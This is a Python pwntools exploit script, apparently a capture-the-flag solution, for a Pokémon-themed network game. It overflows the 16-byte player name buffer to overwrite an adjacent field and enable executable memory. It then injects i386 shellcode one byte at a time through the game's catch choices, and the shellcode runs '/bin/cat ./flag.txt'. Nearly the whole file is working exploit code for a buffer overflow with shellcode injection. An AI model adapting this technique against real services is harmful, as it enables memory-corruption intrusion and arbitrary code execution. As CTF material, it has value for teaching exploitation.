#!/usr/bin/env python3
from helper import *
from pwn import *

# bytes encoding
enc = 'utf-8'

# start binary
p = remote('<host>', 6969)

# This is in the player struct. This is also the number of
# catch attempts allowed.
POKEBALLS_ALLOWED = 100
# len(player->name) = 16
buffer_len = 16
# Create content for the buffer to overflow (player->name).
fill_buf = 'a' * buffer_len
# Overwrite field player->ability.
# Ability number (squirtle = 1, success = 6) -> (0x1 | 0x6). 
# Also mmap RWX->(0x1 | 0x2 | 0x4).
magic_bytes = b'\x07'

# Create the payload.
# Create the shellcode.
payload = bytes(fill_buf, enc) +  magic_bytes
shellcode = asm(pwnlib.shellcraft.i386.linux.execve(path="/bin/cat", argv=["/bin/cat", "./flag.txt"]))

# Send the payload
print(f'sending bytes: {payload}')
p.sendline(payload)

# Get response
line = p.recvuntil(b'}\r\n')
print(line.decode())

# Iterate through responses, write the shellcode.
for b in shellcode:
   line = p.recvuntil(b'!\r\n\r\n') # found
   p.recvuntil(b'y/n:\r\n')
   poke = line.decode().split("found")[1].strip()[:-1]
   p_id = pokemon(poke)
   while p_id != b:
     p.sendline(b'n')
     line = p.recvuntil(b'!\r\n\r\n') # found
     poke = line.decode().split("found")[1].strip()[:-1]
     p.recvuntil(b'y/n:\r\n') # catch
     p_id = pokemon(poke)
   print(f'pokemon: {poke} = {p_id}')
   p.sendline(b'y')
   p.recvline() # did it run away?
   p.recvline() # balls left

# Finish.
p.sendlineafter(b'y/n:', b'f')

# Print end of program and output.
lines = p.recvuntil(b'}')
print(lines.decode())
